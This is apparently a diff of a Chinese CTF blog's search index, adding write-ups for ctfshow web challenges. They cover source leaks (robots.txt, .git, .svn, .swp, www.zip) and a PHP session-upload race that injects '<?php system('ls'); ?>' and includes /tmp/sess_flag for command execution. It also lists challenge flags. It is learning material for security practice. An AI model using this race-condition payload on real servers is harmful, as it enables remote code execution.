@@ -233,6 +233,76 @@
       </tags>
   </entry>
   <entry>
+    <title>web1-10</title>
+    <url>/2025/01/19/web1-10/</url>
+    <content><![CDATA[<h1>Web1:</h1>
+<p><img src="wps1.jpg" alt="img"></p>
+<p>直接f12。看到flag</p>
+<p>ctfshow{941628a1-7381-4612-9c0f-201bede5949c}</p>
+<h1>Web2:</h1>
+<p><img src="wps2.jpg" alt="img"></p>
+<p>看不了源码（右键不管用、f12不管用）</p>
+<p>法一：不怕抓包</p>
+<p>法二：firefox浏览器直接ctrl+u看源码</p>
+<p>ctfshow{836f5d1a-952d-41fb-a059-748adf37147</p>
+<h1>Web3:</h1>
+<p><img src="wps3.jpg" alt="img"></p>
+<p>啥都没有，bp抓包</p>
+<p>ctfshow{f40cb561-9170-4abf-96b5-422812ef996f}</p>
+<h1>Web4:</h1>
+<p>bp抓包</p>
+<p>没思路，看题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
+<p>Robots:即robots.txt。这个文件可能会泄露部分网站目录</p>
+<p>在url后面添加/robots.txt</p>
+<p><img src="wps4.jpg" alt="img"></p>
+<p>复制/flagishere.txt，替换url后面的robots.txt</p>
+<p>进去</p>
+<p>ctfshow{5e980d7b-1652-4fd2-aa6f-fb9ce4e92f8d}</p>
+<h1>Web5</h1>
+<p>Bp抓包无果，查看提示：phps源码泄露有时候能帮上忙</p>
+<p>这道题是php源码泄露，查看响应头，</p>
+<p><img src="wps5.jpg" alt="img"></p>
+<p>X-Powered-Bys后面是php及其版本。</p>
+<p>php的主页文件是index.php</p>
+<p>访问index.php发现还是原来的界面</p>
+<p>然后在后面加一个s可以下载一个文件</p>
+<p>ctfshow{fb1c7fe7-f1d8-47de-be54-2a32756be6c8}</p>
+<h1>Web6</h1>
+<p>看提示:解压源码到当前目录，测试正常，收工</p>
+<p>网站主页源码文件名称为www.zip，然后再url后添加/www.zip对网站主页源码进行下载,然后进行解压</p>
+<p><img src="wps6.jpg" alt="img"></p>
+<p>ctfshow{83099411-6ed3-4ec1-9336-8fe1d68f5bad}</p>
+<h1>Web7:</h1>
+<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
+<p>git代码泄露，直接访问/.git即可</p>
+<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
+<p>ctfshow{3caad85e-71c8-4867-9a13-a6cc8a85c4ff}</p>
+<h1>Web8:</h1>
+<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
+<p>svn泄露,直接访问/.svn即可</p>
+<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
+<p>ctfshow{2c8a2ed9-20cd-4c41-b0a6-42a3801bf904}</p>
+<h1>Web9</h1>
+<p>提示:发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
+<p>vim缓存信息泄露，直接访问/index.php.swp即可</p>
+<p>ctfshow{6b667116-0c5a-4fca-b6ad-f589fc29fb9f}</p>
+<h1>Web10</h1>
+<p>提示:cookie 只是一块饼干，不能存放任何隐私数据</p>
+<p><img src="wps7.jpg" alt="img"></p>
+<p>ctfshow{f7c26679-f08a-40c9-aff2-6a373d3a17c8}</p>
+<h1><em><strong>1–10总结</strong></em></h1>
+<p>1.无法查看源码？Firefox当中ctrl+u查看|bp|设置当中点出来</p>
+<p>/robots.txt会泄露部分网站目录</p>
+<p>2.php源码泄露：X-Powered-Bys后面是php及其版本。php的主页文件是index.php。然后在后面加一个s可以下载一个文件</p>
+<p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
+<p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
+<p>5.vim缓存信息泄露，/index.php.swp</p>
+]]></content>
+      <tags>
+        <tag>ctfshow_web_命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pwn6-12</title>
     <url>/2025/01/19/pwn6-12/</url>
     <content><![CDATA[<h2 id="前置基础">前置基础</h2>
@@ -320,76 +390,6 @@
 ]]></content>
       <tags>
         <tag>ctfshow_pwn_前置基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web1-10</title>
-    <url>/2025/01/19/web1-10/</url>
-    <content><![CDATA[<h1>Web1:</h1>
-<p><img src="wps1.jpg" alt="img"></p>
-<p>直接f12。看到flag</p>
-<p>ctfshow{941628a1-7381-4612-9c0f-201bede5949c}</p>
-<h1>Web2:</h1>
-<p><img src="wps2.jpg" alt="img"></p>
-<p>看不了源码（右键不管用、f12不管用）</p>
-<p>法一：不怕抓包</p>
-<p>法二：firefox浏览器直接ctrl+u看源码</p>
-<p>ctfshow{836f5d1a-952d-41fb-a059-748adf37147</p>
-<h1>Web3:</h1>
-<p><img src="wps3.jpg" alt="img"></p>
-<p>啥都没有，bp抓包</p>
-<p>ctfshow{f40cb561-9170-4abf-96b5-422812ef996f}</p>
-<h1>Web4:</h1>
-<p>bp抓包</p>
-<p>没思路，看题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。</p>
-<p>Robots:即robots.txt。这个文件可能会泄露部分网站目录</p>
-<p>在url后面添加/robots.txt</p>
-<p><img src="wps4.jpg" alt="img"></p>
-<p>复制/flagishere.txt，替换url后面的robots.txt</p>
-<p>进去</p>
-<p>ctfshow{5e980d7b-1652-4fd2-aa6f-fb9ce4e92f8d}</p>
-<h1>Web5</h1>
-<p>Bp抓包无果，查看提示：phps源码泄露有时候能帮上忙</p>
-<p>这道题是php源码泄露，查看响应头，</p>
-<p><img src="wps5.jpg" alt="img"></p>
-<p>X-Powered-Bys后面是php及其版本。</p>
-<p>php的主页文件是index.php</p>
-<p>访问index.php发现还是原来的界面</p>
-<p>然后在后面加一个s可以下载一个文件</p>
-<p>ctfshow{fb1c7fe7-f1d8-47de-be54-2a32756be6c8}</p>
-<h1>Web6</h1>
-<p>看提示:解压源码到当前目录，测试正常，收工</p>
-<p>网站主页源码文件名称为www.zip，然后再url后添加/www.zip对网站主页源码进行下载,然后进行解压</p>
-<p><img src="wps6.jpg" alt="img"></p>
-<p>ctfshow{83099411-6ed3-4ec1-9336-8fe1d68f5bad}</p>
-<h1>Web7:</h1>
-<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
-<p>git代码泄露，直接访问/.git即可</p>
-<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
-<p>ctfshow{3caad85e-71c8-4867-9a13-a6cc8a85c4ff}</p>
-<h1>Web8:</h1>
-<p>提示:版本控制很重要，但不要部署到生产环境更重要。</p>
-<p>svn泄露,直接访问/.svn即可</p>
-<p>在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
-<p>ctfshow{2c8a2ed9-20cd-4c41-b0a6-42a3801bf904}</p>
-<h1>Web9</h1>
-<p>提示:发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
-<p>vim缓存信息泄露，直接访问/index.php.swp即可</p>
-<p>ctfshow{6b667116-0c5a-4fca-b6ad-f589fc29fb9f}</p>
-<h1>Web10</h1>
-<p>提示:cookie 只是一块饼干，不能存放任何隐私数据</p>
-<p><img src="wps7.jpg" alt="img"></p>
-<p>ctfshow{f7c26679-f08a-40c9-aff2-6a373d3a17c8}</p>
-<h1><em><strong>1–10总结</strong></em></h1>
-<p>1.无法查看源码？Firefox当中ctrl+u查看|bp|设置当中点出来</p>
-<p>/robots.txt会泄露部分网站目录</p>
-<p>2.php源码泄露：X-Powered-Bys后面是php及其版本。php的主页文件是index.php。然后在后面加一个s可以下载一个文件</p>
-<p>3.网站主页源码文件名称为www.zip。/www.zip对网站主页源码进行下载,然后进行解压。本地看过之后在url进行操作</p>
-<p>4.在Linux当中.开头的文件为隐藏文件,网站管理员可能会存在在没有删除.svn或者.git隐藏文件的情况下就将网站上线，这样就会造成源码泄露</p>
-<p>5.vim缓存信息泄露，/index.php.swp</p>
-]]></content>
-      <tags>
-        <tag>ctfshow_web_命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -645,13 +645,6 @@
       <tags>
         <tag>ctfshow_web_命令执行</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>搞砸了</title>
-    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
-    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
-<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
-]]></content>
   </entry>
   <entry>
     <title>web31-命令执行结束</title>
@@ -1112,6 +1105,57 @@ preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变�
       </tags>
   </entry>
   <entry>
+    <title>web82-86竞争</title>
+    <url>/2025/01/25/web82-86%E7%AB%9E%E4%BA%89/</url>
+    <content><![CDATA[<h1>web82</h1>
+<p>在cookie中设置PHPSESSID（即session 的值）=flag，那么会在服务器上创建一个/tmp/sess_flag文件，对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。<br>
+首先我们需要编写以下html脚本，进行临时文件上传，上传文件的同时传入一个参数及其值:PHP_SESSION_UPLOAD_PROGRESS=<?php system('ls'); ?>，这样达到<a href="https://so.csdn.net/so/search?q=%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81&amp;spm=1001.2101.3001.7020">恶意代码</a>的上传，进而执行命令。  注：记得修改url为你做题的网址</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://04485255-5dd1-4cb0-a34a-e59b3e194b81.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>文件随便上传一个</p>
+<p>发送到i(爆破)</p>
+<p>然后在Cookie后面添加PHPSESSID=flag,以生成sess_flag文件</p>
+<p><img src="image-20250125021609888.png" alt="image-20250125021609888"></p>
+<p>?file=/tmp/sess_flag</p>
+<p><img src="image-20250125020408645.png" alt="image-20250125020408645"></p>
+<p>不涉及爆破，需要清除$,点击上边的清除playload位置$</p>
+<p>如果无法清除，在最后一行加一个地方，选中空白即可</p>
+<p><img src="image-20250125020725543.png" alt="image-20250125020725543"></p>
+<p>此处设置 null payload 以及 无限重复</p>
+<p><img src="image-20250125020752186.png" alt="image-20250125020752186"></p>
+<p>新建一个资源池，设置线程为30</p>
+<p><img src="image-20250125020823707.png" alt="image-20250125020823707"></p>
+<p>点击开始，在后面点长度，我这是900接近一千的数字，在下面的响应里面有fl0g.php</p>
+<p><img src="image-20250125021716036.png" alt="image-20250125021716036"></p>
+<p>一边上传一边访问文件，由于访问文件比上传快，所以更能成功。</p>
+<p>可见长度与其他不同，点击查看回显结果，得到文件名：fl0g.php，更改命令，cat fl0g.php</p>
+<p><img src="image-20250125022131210.png" alt="image-20250125022131210"></p>
+<p>ctfshow{bd8c3428-76be-488f-b256-2caa6491ab85}</p>
+<h1>web83</h1>
+<p><img src="image-20250125022829690.png" alt="image-20250125022829690"></p>
+<p>我这web82的保存下来了</p>
+<p><img src="image-20250125022921448.png" alt="image-20250125022921448"></p>
+<p><img src="image-20250125022936154.png" alt="image-20250125022936154"></p>
+<p><img src="image-20250125022950921.png" alt="image-20250125022950921"></p>
+<h1>web84</h1>
+<p>直接写最后一步了，虽然源码变了奥，但是还是能拿flag</p>
+<p><img src="image-20250125023653322.png" alt="image-20250125023653322"></p>
+<h1>web85</h1>
+<p><img src="image-20250125024026566.png" alt="image-20250125024026566"></p>
+<h1>web86</h1>
+<p><img src="image-20250125025211879.png" alt="image-20250125025211879"></p>
+]]></content>
+      <tags>
+        <tag>web竞争</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搞砸了</title>
+    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
+    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
+<p><img src="image-20250122014041713.png" alt="image-20250122014041713"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>文件包含</title>
     <url>/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>正式开始文件包含</p>
@@ -1356,6 +1400,7 @@ php://input用于执行php代码。</p>
 <p>ctfshow{3b47fcc8-c7cd-453d-b807-fb93b3395516}</p>
 <p>还有UCS-4</p>
 <h1>凌晨4点，玩会儿手机睡觉了，web82-86竞争环境，明天凌晨再搞了</h1>
+<h1>web82-86由于需要图例展示，又开了一篇新的，请移步</h1>
 ]]></content>
       <tags>
         <tag>文件包含</tag>
